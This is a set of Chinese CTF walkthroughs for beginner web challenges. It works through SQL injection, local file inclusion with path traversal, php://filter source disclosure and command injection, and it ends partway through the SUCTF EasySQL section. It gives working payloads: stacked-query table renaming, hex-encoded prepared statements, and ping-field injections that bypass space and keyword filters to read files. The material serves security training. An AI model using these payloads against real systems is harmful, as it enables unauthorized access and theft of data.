# Web

## [极客大挑战 2019]EasySQL 1

网页环境<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697269227979-fd564186-7adb-4eaf-9e3e-8424fdd19fa4.png#averageHue=%230c0c0c&clientId=uf24ad900-2f88-4&from=paste&height=747&id=u1f8820fd&originHeight=934&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=569569&status=done&style=none&taskId=u5bf2ca64-b145-4ca8-9fea-76843b29330&title=&width=1530.4)<br />可以看到是一个登录窗口，题目已经说了是SQL注入<br />首先试一下弱口令，admin,123<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697269500707-e261da2b-33fa-446f-b907-e898575facae.png#averageHue=%23100909&clientId=uf24ad900-2f88-4&from=paste&height=747&id=u4b689535&originHeight=934&originWidth=1899&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=576337&status=done&style=none&taskId=ue42bb3eb-811a-4bb8-a5ad-0a9c898c1fb&title=&width=1519.2)<br />提示用户名密码错了<br />既然是第一道题，那应该是很简单了<br />判断是数字型还是字符型

1. 数字型

`and 1=1 回显正常`<br />`and 1=2 返回异常，存在数字型注入可能`

2. 字符型

`1 返回正常`<br />`1' 返回异常，存在字符型注入可能`<br />经过测试，发现username和password两个参数都可以分别注入和同时注入<br />构造payload<br />`url?usename=1'&password=1'`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697270426620-acb3876c-9f0d-4dad-b7b5-b7e2f50b557f.png#averageHue=%230b0a0a&clientId=u50427f58-e377-4&from=paste&height=750&id=uac410499&originHeight=938&originWidth=1916&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=578355&status=done&style=none&taskId=u9824586b-054d-4e84-998e-a4f99a53025&title=&width=1532.8)<br />回显报错，存在SQL字符型注入<br />**小试一下万能密码注入**<br />构造payload<br />`url?usename=1' or '1'='1&password=1' or '1'='1`<br />**回显flag**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697270808644-23610741-6cba-4ccc-ac0d-20688612546d.png#averageHue=%230b0a0a&clientId=u50427f58-e377-4&from=paste&height=746&id=u61a5ec44&originHeight=933&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=588001&status=done&style=none&taskId=u34c8a5ee-5cfa-462d-8975-2dd088f61f5&title=&width=1524)<br />![](https://cdn.nlark.com/yuque/0/2023/jpeg/36016220/1697271707206-5d837e64-976e-44fc-b710-05a0ca10dd88.jpeg)

## [极客大挑战 2019]Havefun 1

网页环境<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697789393846-9148e474-ac05-4ced-8fb6-694a470ae325.png#averageHue=%23aae6da&clientId=udc76d59d-d910-4&from=paste&height=758&id=EPVgZ&originHeight=948&originWidth=1892&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24499&status=done&style=none&taskId=u09e967db-f466-4bd7-934a-31dcca38159&title=&width=1513.6)<br />title标题<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697789429253-bddc9ec0-be13-4fda-9d05-ca9e24024c6c.png#averageHue=%23fafaf9&clientId=udc76d59d-d910-4&from=paste&height=32&id=u658998dc&originHeight=40&originWidth=242&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2099&status=done&style=none&taskId=u55a9820b-ce79-4425-a498-8d81be75cdd&title=&width=193.6)<br />每一帧都不要放过，或许那个不起眼的地方就存在重要信息<br />到这并未发现什么重要信息，F12看看<br />在源代码底部发现PHP代码：
```php
<!--  
 $cat=$_GET['cat'];  
 echo $cat;  
 if($cat=='dog'){  
 	echo 'Syc{cat_cat_cat_cat}';  
 }  
 --> 
```
**PHP代码审计**
> 1. 通过GET方式进行传参（就是通过URL地址进行传参)，这个参数是cat
> 2. 输出参数cat的值
> 3. if判断语句，当cat=dog的时候即可输出flag

构造payload：<br />`url/?cat=dog`<br />**爆出flag：**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697790811744-a4a7a614-4cf3-4b63-8d0c-984a715f94c8.png#averageHue=%23aae6db&clientId=ua82db3db-7fc5-4&from=paste&height=744&id=uf8feeda1&originHeight=930&originWidth=1882&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=28162&status=done&style=none&taskId=ueef1f1a6-ae40-4e85-84ea-c7cd9dcbb55&title=&width=1505.6)

## [HCTF 2018]WarmUp 1

题目环境：<br />![image](https://github.com/adm3n-hnt/CTF-Study/assets/79041980/ee5feecb-9dee-4754-bb41-ad6cc4c8d1a5)
<br />发现除了表情包，再无其他<br />F12试试<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697974053018-52fc716e-bc2c-45b6-9c17-2fd96014fb71.png#averageHue=%23fdfcfc&clientId=ub5185c9b-7e11-4&from=paste&height=214&id=u416571cf&originHeight=267&originWidth=673&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15663&status=done&style=none&taskId=u0bff4cc1-b75b-436b-bf23-32bb1aadcaf&title=&width=538.4)<br />发现source.php文件<br />访问这个文件，格式如下：<br />`url/source.php`<br />回显如下：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697974496348-8399c824-58b6-4335-8594-7e880b3324ef.png#averageHue=%23fefdfd&clientId=ub5185c9b-7e11-4&from=paste&height=760&id=u1a03ad0b&originHeight=950&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26282&status=done&style=none&taskId=u1cd2ad08-88b9-4eac-a6cc-4519f4012c6&title=&width=1534.4)<br />PHP代码审计：
```php
<?php
highlight_file(__FILE__);
class emmm
{
	public static function checkFile(&$page)
	{
    $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
    if (! isset($page) || !is_string($page)) {
    echo "you can't see it";
    return false;
    }
    
    if (in_array($page, $whitelist)) {
    return true;
    }
    
    $_page = mb_substr(
    $page,
    0,
    mb_strpos($page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
    return true;
    }
    
    $_page = urldecode($page);
    $_page = mb_substr(
    $_page,
    0,
    mb_strpos($_page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
    return true;
    }
    echo "you can't see it";
    return false;
  }
}

if (! empty($_REQUEST['file'])
&& is_string($_REQUEST['file'])
&& emmm::checkFile($_REQUEST['file'])
) {
include $_REQUEST['file'];
exit;
} else {
echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
}  
?>
```
> 1. 定义了一个名为emmm的类，该类有一个静态方法checkFile。checkFile方法接受一个字符串参数$page，这个参数可能代表一个文件名。
> 2. 定义了一个$whitelist数组，这个数组里面存在两个元素是"source.php"和"hint.php"。
> 3. checkFile方法首先检查$page是否存在且为字符串。如果不满足这些条件，它将输出"you can't see it"并返回false。
> 4. 然后，checkFile方法检查$page是否存在于一个名为$whitelist的数组中。这个数组包含两个元素，分别是"source.php"和"hint.php"。如果$page在$whitelist中，方法将返回true。
> 5. 如果$page不在$whitelist中，那么checkFile方法将尝试通过以下步骤查找匹配的文件名：
>    - 首先，它将$page和问号(?)连接起来，然后查找这个字符串在$page中的位置。这可能是为了检查是否存在一个查询字符串。
>    - 然后，它对$page进行url解码，再重复之前的步骤。
>    - 如果以上两种方式都未能找到匹配的文件名，那么方法将输出"you can't see it"并返回false。
> 6. 在类的定义之外，这段代码检查了一个名为$_REQUEST['file']的变量。如果这个变量非空且为字符串，并且通过emmm::checkFile($_REQUEST['file'])检查，那么它将包含(include)这个文件并退出。否则，它将显示最初页面的那个滑稽表情包图片。
> 7. 总的来说，给了我们一个参数是file，我们给file参数传值就等于是给page参数传值，传的值需要提前用英文问号（?）连接起来，然后我们就可以找flag，怎么找flag是个问题，但是在代码里面还有一个名为hint.php的文件，不妨去看看，或许有咱们需要的信息。

查看hint.php内容<br />查看格式:<br />`url/hint.php`<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697975963284-97546441-9786-46ad-9d1f-2599a6599f95.png#averageHue=%23fefefe&clientId=ub5185c9b-7e11-4&from=paste&height=746&id=u305af69c&originHeight=933&originWidth=1890&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20963&status=done&style=none&taskId=uf4205885-caab-469e-8a98-72d48dae815&title=&width=1512)<br />这里说flag在**ffffllllaaaagggg**文件里面<br />有了目标就好办了，构造下payload：<br />`url/source.php?file=hint.php?/ffffllllaaaagggg`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697976368038-08caff31-561b-487f-b2cc-bc5a8fea83ea.png#averageHue=%23fefefe&clientId=ub5185c9b-7e11-4&from=paste&height=746&id=ue12ed593&originHeight=933&originWidth=1897&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23883&status=done&style=none&taskId=u72bc8df1-d739-4fd3-9271-f02340f417d&title=&width=1517.6)<br />竟然什么都没有显示<br />**分析一下原因：**
> 1. 首先我们的payload要在source.php文件下进行，因为参数在这里面。
> 2. flag在ffffllllaaaagggg里面，ffffllllaaaagggg又在hint.php里面，并且$whitelist数组里面也存在hint.php文件，所以说要先进到hint.php文件里面。
> 3. 英文问号(?)连接后面的字符串也没有问题
> 4. 到这里payload构造是没有问题的，那么问题就出在了找flag的位置不对！
> 5. 我们这个payload是在hint.php文件里面找的，但是没有，返回上一级找找看？问题是也不知道flag具体在哪一级，那就构造多一些，溢出的部分没关系，这里只会显示最后一个目录。
> 6. 了解一下：
> 
1、“.”表示当前目录，也可以用“./”表示。
> 2、“..”表示上一级目录，也可以用“../”表示。
> 3、“~” 代表用户自己的宿主目录。
> 4、“/”处于Linux文件系统树形结构的最顶端，我们称它为Linux文件系统的root，它是Linux文件系统的入口。

**继续构造payload：**<br />`url/source.php?file=hint.php?../../../../../../ffffllllaaaagggg`<br />这里就是说一直返回上一级查找，直到查找到flag为止，最终返回到/root根目录，因为ffffllllaaaagggg原本是在hint.php文件里面嘛，所以说要一直往上一级目录找它的原始位置，<br />../倒不是一定是6个，看你的flag具体在那个上一级目录了😉<br />上传payload<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697977284649-5b659143-d504-4ace-b1c1-f09a3d4919c5.png#averageHue=%23fefefe&clientId=ub5185c9b-7e11-4&from=paste&height=740&id=u3c6d46da&originHeight=925&originWidth=1526&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30633&status=done&style=none&taskId=u126f933d-d65c-40bf-9faa-b9de17c4e02&title=&width=1220.8)<br />**爆出flag：**<br />`flag{89c3539b-c6f4-4454-892a-ff1e460a560b}`

## [ACTF2020 新生赛]Include 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134020267-86822c9a-ec92-4a1e-b22c-b2112efdb3ee.png#averageHue=%23ffffff&clientId=u8db967fb-52e9-4&from=paste&height=86&id=u9d2cf06e&originHeight=108&originWidth=292&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=994&status=done&style=none&taskId=u2a26d94d-5aef-4f9d-a33e-dc397f538b3&title=&width=233.6)<br />超链接，点进去看看<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134074547-c749cc10-31be-4dc9-910d-cc155dd86a47.png#averageHue=%23f9f7f6&clientId=u8db967fb-52e9-4&from=paste&height=60&id=u6e2598e7&originHeight=75&originWidth=359&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2304&status=done&style=none&taskId=ud2595288-51b7-40d9-880f-fbef789bbe0&title=&width=287.2)<br />你能找到flag吗？<br />除了这些网页什么都没有，但是不当紧，因为我们有一双善于发现的眼睛👀<br />F12瞅瞅<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134230106-8aba5c20-f581-430e-8dfd-3853258a4dec.png#averageHue=%23f7f7f6&clientId=u8db967fb-52e9-4&from=paste&height=60&id=u522e286c&originHeight=75&originWidth=306&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1590&status=done&style=none&taskId=uad68142b-4b70-43fa-ba46-c2420a36283&title=&width=244.8)<br />无，并无其他<br />等等URL看了吗？<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134295681-4af81dcd-991d-4f0b-9271-c44f9d8c6425.png#averageHue=%23e9e6e4&clientId=u8db967fb-52e9-4&from=paste&height=34&id=ub3d3abb5&originHeight=42&originWidth=705&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=4706&status=done&style=none&taskId=u36343248-7e57-492a-82f6-b3a9e195070&title=&width=564)<br />发现存在一个参数file，并且已经给出flag.php文件了<br />主题题目名称Include，意为文件包含，大部分文件包含都要用到PHP伪协议<br />通过PHP伪协议构造payload：<br />`URL/?file=php:filter/read=convert.base64-encode/resource=flag.php`
> 通过PHP伪协议读取flag.php文件，并通过base64编码格式显示出来
> 想要了解更多PHP伪协议可以看我这篇同类题目，希望对大家的学习有所帮助

[fileclude-CTF 解题思路-CSDN博客](https://blog.csdn.net/m0_73734159/article/details/130383801?spm=1001.2014.3001.5501)<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134847514-d4ae6b5a-bcc4-4742-b695-08f4289fc16a.png#averageHue=%23ece7e3&clientId=u8db967fb-52e9-4&from=paste&height=30&id=u3581d467&originHeight=38&originWidth=1524&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8955&status=done&style=none&taskId=u1d3e4945-1e59-47c4-ae90-de9ac52c5be&title=&width=1219.2)<br />`PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NDAwZjJiYzYtOGI2Mi00NWEyLTg1ZDQtMmVkYzU0MjY4MTU0fQo=`<br />base64解码一把梭<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698134962350-0b61c7c4-3050-49aa-9554-ff84826c299d.png#averageHue=%23fcfafa&clientId=u8db967fb-52e9-4&from=paste&height=366&id=u4516bb27&originHeight=457&originWidth=1857&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41230&status=done&style=none&taskId=u58662f99-af00-43ce-825d-3d16d3df8fe&title=&width=1485.6)<br />**得出flag：**<br />`**flag{400f2bc6-8b62-45a2-85d4-2edc54268154}**`

## [ACTF2020 新生赛]Exec 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200273276-d8bf8b0f-d18f-4412-bd93-8298fe43b65d.png#averageHue=%23fafafa&clientId=u90f92586-9a2e-4&from=paste&height=217&id=u1ff865d8&originHeight=271&originWidth=422&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7249&status=done&style=none&taskId=uef777c1e-df70-4229-bccf-479692edf47&title=&width=337.6)<br />是一个ping操作，ping个127.0.0.1试试<br />有回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200374948-9b9106de-3cb0-456c-bcaf-7b2264745f7e.png#averageHue=%23f7f6f6&clientId=u90f92586-9a2e-4&from=paste&height=362&id=u4c09c0b6&originHeight=453&originWidth=737&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29419&status=done&style=none&taskId=uc6f6b8d9-8e81-4db6-b0a6-ce484f5868b&title=&width=589.6)<br />**看起来有点像PWN的题，猜测通过列出目录文件，是否存在flag文件，并查看文件内容，并且存在两种方法解题，一种是管道符，一种是堆叠查询**
<a name="kJ9SD"></a>
### **第一种、管道符**
列出目录文件<br />`127.0.0.1 | ls`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200626535-7603173b-89cb-467f-8a80-dd326dc6b9ec.png#averageHue=%23fbfafa&clientId=u90f92586-9a2e-4&from=paste&height=238&id=udc3c072c&originHeight=298&originWidth=608&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14860&status=done&style=none&taskId=ua96231c2-f06f-4b22-bcfc-c615a685d0b&title=&width=486.4)<br />列出隐藏文件<br />`127.0.0.1 | ls -a`<br />发现存在上级目录<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200737957-c7c1e57b-81ab-4f32-9b73-1132755e7e9f.png#averageHue=%23f9f9f9&clientId=u90f92586-9a2e-4&from=paste&height=272&id=u7222c59c&originHeight=340&originWidth=509&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13679&status=done&style=none&taskId=u5eb2e479-1d42-4f90-9d87-1e77f1909cc&title=&width=407.2)<br />因此可以看出，此处命令执行并不是在root/根目录下进行的\<br />列出/根目录下的目录文件<br />`127.0.0.1 | ls /`![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698200911159-c35404fc-a613-4749-a295-af252df9ab3f.png#averageHue=%23f7f7f6&clientId=u90f92586-9a2e-4&from=paste&height=542&id=u541df299&originHeight=677&originWidth=758&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22769&status=done&style=none&taskId=u119b73cc-c464-4645-8912-76002e2bfb9&title=&width=606.4)<br />存在flag，查看根目录下flag文件的内容<br />`127.0.0.1 | cat /flag`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698201091955-da441925-18eb-4b20-a3bc-3d787212779f.png#averageHue=%23fafaf9&clientId=u90f92586-9a2e-4&from=paste&height=235&id=u18dbeba0&originHeight=294&originWidth=551&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13795&status=done&style=none&taskId=uc0310f77-164d-4d25-9277-7434ed2f55b&title=&width=440.8)<br />**得出flag：**<br />`**flag{ce0a3875-bc2a-49f9-b285-dccdf195531b}**`

<a name="OH7u8"></a>
### **第二种、堆叠查询**
列出当前目录文件；列出隐藏文件；列出根目录下的文件；查看根目录下flag文件的内容<br />`127.0.0.1;ls;ls -a;ls /;cat /flag`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698201726844-14a619f6-1821-472c-ac35-9a2ee3f40d45.png#averageHue=%23f5f5f5&clientId=u90f92586-9a2e-4&from=paste&height=758&id=ufa57bd66&originHeight=948&originWidth=1063&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66837&status=done&style=none&taskId=u995fe147-fc69-4add-b6b4-fa09bff2b73&title=&width=850.4)<br />**得出flag：**<br />`**flag{ce0a3875-bc2a-49f9-b285-dccdf195531b}**`<br />两种方法可以看出有明显的不同

## [GXYCTF2019]Ping Ping Ping 1

题目环境<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698213860659-24b1340b-4b31-4179-858c-eb21e6fe7ca6.png#averageHue=%23fdfdfd&clientId=ub5d3c2c2-2e29-4&from=paste&height=80&id=u3cb957d5&originHeight=100&originWidth=194&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=942&status=done&style=none&taskId=u709bb2d6-dff9-4f14-9762-6572d3ef5d6&title=&width=155.2)
> 给了一个ip参数
> 注意题目Ping Ping Ping
> 意思就是让我们进行Ping地址
> 随便输入一个地址Ping一下

`URL?ip=0`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698214503187-24afc92e-d4f5-44d8-9357-7ee5cc42073e.png#averageHue=%23f2f2f2&clientId=ub5d3c2c2-2e29-4&from=paste&height=194&id=u2f328aee&originHeight=243&originWidth=509&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6638&status=done&style=none&taskId=u2b46f94e-eb00-44b7-8783-39f777d4836&title=&width=407.2)
> 有回显结果，和上题类似
> [[ACTF2020 新生赛]Exec 1-CSDN博客](https://blog.csdn.net/m0_73734159/article/details/134029479?spm=1001.2014.3001.5501)

查看当前目录文件<br />`URL?ip=0;ls`（这里使用堆叠注入查询）<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698215336545-0196e2f9-1197-4aec-9d73-1d7e2291aa10.png#averageHue=%23f3f3f3&clientId=ub5d3c2c2-2e29-4&from=paste&height=208&id=u8bb77e42&originHeight=260&originWidth=514&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11528&status=done&style=none&taskId=u7270158f-a2c2-489e-9e04-e52847199ac&title=&width=411.2)<br />直接给出了咱们flag文件，事实上真的有这么简单吗？<br />查看flag文件看看是什么情况<br />`URL?ip=0;cat flag.php`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698215574532-4eb59f0a-d7cc-4a5b-96f3-92ca289c26b1.png#averageHue=%23f4f1f0&clientId=ub5d3c2c2-2e29-4&from=paste&height=33&id=u90d497d1&originHeight=41&originWidth=286&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1795&status=done&style=none&taskId=u4cc81793-fcc6-408e-990d-ff9c9573b39&title=&width=228.8)<br />空格报错！<br />查看flag关键字是否被过滤<br />`URL?ip=0;flag.php`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698216109157-fca1c30b-1dc9-40e2-9fde-9362e959bce4.png#averageHue=%23f6f4f2&clientId=ub5d3c2c2-2e29-4&from=paste&height=50&id=ub5b17a0d&originHeight=62&originWidth=223&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1798&status=done&style=none&taskId=ue0d0ebcc-17bb-424b-9b52-b49ae68ee50&title=&width=178.4)<br />flag报错！<br />查看字符是否被过滤<br />`URL?ip=0;/`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698216192362-6f85930f-085f-4100-aa36-0f36e2f4d802.png#averageHue=%23f5f3f1&clientId=ub5d3c2c2-2e29-4&from=paste&height=42&id=u65550639&originHeight=53&originWidth=276&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2005&status=done&style=none&taskId=u4032e5b2-9131-4d9f-b41b-270633e2eee&title=&width=220.8)<br />字符报错！<br />好啊好啊，过滤这么多东西，不过好在/符号不用绕过了，因为flag就在当前目录<br />**空格绕过**
> 1. cat${IFS}flag.txt 
> 2. cat$IFS$9flag.txt （正整数可以是任意）
> 3. cat<flag.txt 
> 4. cat<>flag.txt
> 5.  {cat,flag.txt}

**flag关键字绕过**
> 可以使用定义变量绕过
> $x=ag
> fa$x=flag

**构造payload：**<br />`**URL?ip=0;x=ag;cat${IFS}fl$x.php**`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219076973-3a184aa5-455d-4a45-a589-0efebf7fb4a3.png#averageHue=%23f7f5f3&clientId=ub5d3c2c2-2e29-4&from=paste&height=38&id=u7ebe6899&originHeight=48&originWidth=350&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2073&status=done&style=none&taskId=u83d5b49d-311e-45fb-bc3b-237b51d3596&title=&width=280)<br />字符报错！<br />猜测"{}"被过滤<br />试试第二种空格绕过方法<br />**构造payload:**<br />`**URL?ip=0;x=ag;cat$IFS$1fl$x.php**`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219718651-776f6cfd-2a1b-4bf7-a8bd-8bec0412f405.png#averageHue=%23f4f4f4&clientId=ub5d3c2c2-2e29-4&from=paste&height=194&id=ube092bab&originHeight=242&originWidth=572&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6709&status=done&style=none&taskId=u9d310f28-ddb7-4529-ab14-a89be2deda3&title=&width=457.6)<br />**有回显结果，绕过成功，但是没有发现flag，F12查看网页源代码，看看有没有flag**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219743590-733bf4b1-15e3-4bad-8374-3d6e45d77975.png#averageHue=%23f4f4f4&clientId=ub5d3c2c2-2e29-4&from=paste&height=216&id=u3ab197a6&originHeight=270&originWidth=581&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12592&status=done&style=none&taskId=u9dcd84a9-a474-4ab9-ad31-1246b948b85&title=&width=464.8)<br />**得出flag：**<br />`flag{08512195-033d-4f18-a5b0-00dcbc58c4b8}`

## [强网杯 2019]随便注 1(超详细，三种解法）

<a name="evxPg"></a>
### **第一种解法 堆叠注入**
网页环境<br />![image.png](https://img-blog.csdnimg.cn/img_convert/434cfacea88d014f556ac56fdbb36d36.png)<br />判断是否是字符型注入<br />`1'`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/2e8bc28f595dbd11974934fa20cfa369.png)<br />判断是否存在关键字过滤<br />`select`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/2c4f19b88e0523022badbf2d4d7d92ec.png)<br />联合查询被过滤，只能用堆叠注入了<br />查看有几个字段<br />`1' order by 2#`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/e3ca73027a6fe25e7ae0afa4bda848c9.png)<br />正常回显<br />`1' order by 3#`![image.png](https://img-blog.csdnimg.cn/img_convert/895055b725e189d42fe79ffc45702f31.png)<br />回显报错，可以看出只有两个字段<br />查看所有数据库<br />`1'; show databases;`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/823d4fa00155a99b585dde3cf3cef82e.png)<br />查看所有数据表<br />`1'; show tables;`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/b56eead234c1e36df2c5049451dec8a1.png)<br />爆words数据表的字段<br />`1';show columns from words;#`![image.png](https://img-blog.csdnimg.cn/img_convert/72352caabc7e406ed88ce07fb607b3c5.png)<br />爆1919810931114514数据表字段（注意数据表为数字的时候需要用反引号括起来）<br />`1';show columns from `1919810931114514`;#`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/014d47d3f850c8e809957090e00fb188.png)<br />可以看到这两个表words表有两个字段，而另一个只有一个字段<br />后台SQL查询语句应该是：<br />`select * from words where id=`<br />所以说只能先查询id字段，然而另一个表只有一个flag字段是肯定爆不了flag的，并且类型为varchar字符串类型，而恰巧words数据表里面的data也是varchar类型，因此从这里就可以得到做题思路，通过rename函数进行改表，把`1919810931114514`改为words，增加新字段id，将flag改为data，将刚开始那个words表改为其他任意表。<br />构造payload：<br />`1';rename table words to BaiMao;rename table `1919810931114514` to words;alter table words add id int unsigned not NULL auto_increment primary key;alter table words change flag data varchar(100);#`
> rename修改表名
> alter修改已知的列
> add增加
> int整数类型
> unsigned无符号类型
> **not null**- 指示某列不能存储 NULL 值。
> **primary key** - NOT NULL 和 UNIQUE 的结合。指定主键，确保某列（或多个列的结合）有唯一标识，每个表有且只有一个主键。
> **auto_increment**-自动赋值，默认从1开始。

成功回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/8122d53a32c6179d396ce793725a8a9c.png)<br />注意没有回显flag，就类似于你更新了个东西但是没刷新，重新在文本框里面输入1提交即可回显flag。
<a name="z4q8F"></a>
### 第二种解法 编码逃逸 绕过滤
由于select被过滤，考虑使用编码进行绕过<br />使用select查询就很简单了<br />构造payload<br />`select *from where `1919810931114514``（注意这里使用反引号把这个数字包括住，md编辑器打不上去） <br />*号查询数据表里面的全部内容，这就是爆出flag的原理<br />进行16进制编码加密<br />`73656c656374202a2066726f6d20603139313938313039333131313435313460`<br />最终payload：<br />`1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#`
> - prepare…from…是预处理语句，会进行编码转换。
> - execute用来执行由SQLPrepare创建的SQL语句。
> - SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。
> - 0x就是把后面的编码格式转换成16进制编码格式
> - 那么总体理解就是，使用SeT方法给变量a赋值，给a变量赋的值就是select查询1919810931114514表的所有内容语句编码后的值，execsql方法执行来自a变量的值，prepare...from方法将执行后的编码变换成字符串格式，execute方法调用并执行execsql方法。
参考：https://blog.csdn.net/qq_44657899/article/details/10323914

回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/d9511654ed16ddd5152c6598b5fecbde.png)
<a name="E2zV0"></a>
### 第三种解法 handler代替select
select命令被过滤了怎么办？我们还可以用handler命令进行查看，handler命令可以一行一行的显示数据表中的内容。<br />构造payload：<br />`1'; handler `1919810931114514` open as `a`; handler `a` read next;#`
> handler代替select，以一行一行显示内容
> open打开表
> as更改表的别名为a
> read next读取数据文件内的数据次数

上传payload，回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/1aa5220a282ceac998065c80dc38af21.png)

## [SUCTF 2019]EasySQL 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698664486260-6f6c0019-9130-4140-a1b2-9cceb09022f5.png#averageHue=%23f8f7f5&clientId=u0afe607f-2d1f-4&from=paste&height=202&id=uf83fd9bc&originHeight=253&originWidth=876&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21417&status=done&style=none&taskId=u889268b8-2948-42df-b872-3ff591d0b4b&title=&width=700.8)
> 把你的旗子给我，我会告诉你旗子是不是对的。

判断注入类型<br />`1'`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698664852183-4cfdd7bb-3ea9-4ce9-be1c-96f1fa803094.png#averageHue=%23f6f4f2&clientId=u0afe607f-2d1f-4&from=paste&height=150&id=uccc2f919&originHeight=187&originWidth=872&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21241&status=done&style=none&taskId=ub4f7196d-1f32-4f95-9828-3ef2dcffc4d&title=&width=697.6)
> 不是字符型SQL注入

`1`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698664998585-28a658de-ffeb-4417-8a45-efb1eb80f4a8.png#averageHue=%23f7f6f4&clientId=u0afe607f-2d1f-4&from=paste&height=186&id=u4da01599&originHeight=232&originWidth=876&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24755&status=done&style=none&taskId=uaa1a1096-cd48-4975-9a5a-9cd4a963bf0&title=&width=700.8)
> 数字型SQL注入

